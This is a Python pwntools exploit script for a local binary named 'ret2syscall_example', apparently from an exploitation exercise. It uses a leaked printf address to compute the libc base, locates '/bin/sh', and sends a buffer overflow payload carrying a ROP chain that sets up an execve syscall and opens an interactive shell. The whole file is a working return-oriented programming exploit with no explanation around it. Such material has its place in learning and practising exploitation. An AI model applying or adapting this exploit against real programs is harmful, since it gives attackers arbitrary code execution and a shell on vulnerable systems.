import sys
import pwn

sys.path.append('../../MyTools')
import gadgets_info
import conversion

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux'
)

target_info = {
	'exec_path': './ret2syscall_example',
	'exec_info': None,
	'libc_info': None,
	'addr_len': 0x8,
	'bfvar2stack': 0xc,
	'libc_base': 0x0,
	'syscall_id': 59,
	'sh_str': 0x0,
	'pop_rax_ret': 0x0,
	'pop_rdi_ret': 0x0,
	'pop_rsi_ret': 0x0,
	'xor_edx_syscall': 0x0,
}

target_info['exec_info'] = pwn.ELF(target_info['exec_path'])
target_info['libc_info'] = target_info['exec_info'].libc

target_info['sh_str'] = target_info['libc_info'].search(b'/bin/sh').__next__()

print('[--] tips: may need update new offset')
target_info['pop_rax_ret'] = gadgets_info.linux_adm64_gadgets['pop_rax_ret_offset']
target_info['pop_rdi_ret'] = gadgets_info.linux_adm64_gadgets['pop_rdi_ret_offset']
target_info['pop_rsi_ret'] = gadgets_info.linux_adm64_gadgets['pop_rsi_ret_offset']
target_info['xor_edx_syscall'] = gadgets_info.linux_adm64_gadgets['xor_edx_syscall_offset']

conn = pwn.process([target_info['exec_path']])

leak4printf = conn.recvline()
print('[++] receive: leak info = {0}'.format(leak4printf[:-1].decode()))
random_addr = conversion.str2int(leak4printf[16:-1].decode())
target_info['libc_base'] = random_addr - target_info['libc_info'].sym['printf']
print('[**] libc base address = {0}'.format(hex(target_info['libc_base'])))

payload = b'A' * target_info['bfvar2stack']
payload += b'B' * target_info['addr_len']
payload += pwn.p64(target_info['libc_base'] + target_info['pop_rax_ret'])
payload += pwn.p64(target_info['syscall_id'])
payload += pwn.p64(target_info['libc_base'] + target_info['pop_rsi_ret'])
payload += pwn.p64(0x0)
payload += pwn.p64(target_info['libc_base'] + target_info['pop_rdi_ret'])
payload += pwn.p64(target_info['libc_base'] + target_info['sh_str'])
payload += pwn.p64(target_info['libc_base'] + target_info['xor_edx_syscall'])

conn.send(payload)
conn.interactive()
